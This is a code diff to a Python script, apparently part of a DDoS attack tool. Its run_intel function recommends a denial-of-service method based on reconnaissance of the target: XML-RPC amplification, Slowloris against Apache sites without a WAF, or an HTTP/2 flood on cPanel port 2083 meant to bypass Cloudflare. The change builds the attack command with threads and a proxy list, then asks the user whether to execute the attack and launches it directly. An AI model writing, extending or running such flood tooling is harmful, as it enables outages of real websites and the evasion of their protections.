@@ -229,20 +229,40 @@ def run_intel():
         if vuln_vector == "XMLRPC":
             rec_method = "XMLRPC"
             reason = "CRITICAL: XML-RPC Amplification detected! Most damage per request."
-            cmd_example = f"python3 start.py XMLRPC {target_url} 7 100 proxy.txt 50 800 (Use Menu 4)"
+            # XMLRPC defaults: threads=100, rpc=50
+            args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
         elif "Apache" in server_header and cdn_guess == "Unknown":
             rec_method = "SLOW"
             reason = "Apache Target without WAF is vulnerable to Slowloris."
-            cmd_example = f"python3 start.py SLOW {target_url} 5 1000 proxy.txt 100 800"
+            # SLOW defaults: threads=100, rpc=1000 (Keep-Alive)
+            args = [rec_method, target_url, "5", "100", "proxy.txt", "1000", "800"]
         elif 2083 in open_ports or 2087 in open_ports:
-            rec_method = "H2_FLOOD (Backend)"
-            reason = "cPanel Ports Open! Attack PORT 2083 to bypass Cloudflare WAF."
+            rec_method = "H2_FLOOD"
+            # Adjust target to port 2083
             target_url = f"{target_url.replace('https://', '').replace('http://', '').split('/')[0]}:2083"
-            cmd_example = f"python3 start.py H2_FLOOD https://{target_url} 7 100 proxy.txt 50 800"
+            reason = "cPanel Ports Open! Attack PORT 2083 to bypass Cloudflare WAF."
+            # H2_FLOOD defaults
+            args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
+        else:
+             # Default H2_FLOOD
+             args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
+
+        cmd_string = f"python3 start.py {' '.join(args)}"
 
         print(f"Method : {bcolors.FAIL}{rec_method}{bcolors.RESET}")
         print(f"Reason : {reason}")
-        print(f"Command: {bcolors.OKBLUE}{cmd_example}{bcolors.RESET}")
+        print(f"Command: {bcolors.OKBLUE}{cmd_string}{bcolors.RESET}")
+        
+        print(f"\n{bcolors.WARNING}[?] Execute this attack now? (y/n): {bcolors.RESET}", end="")
+        q = input().lower()
+        if q.startswith("y"):
+             cmd = ["python3", "start.py"] + args
+             try:
+                subprocess.run(cmd)
+             except KeyboardInterrupt:
+                pass
+             except Exception as e:
+                print(f"Error: {e}")
 
     except ImportError:
          print(f"{bcolors.FAIL}[!] Missing requests library. run 'pip install requests'{bcolors.RESET}")
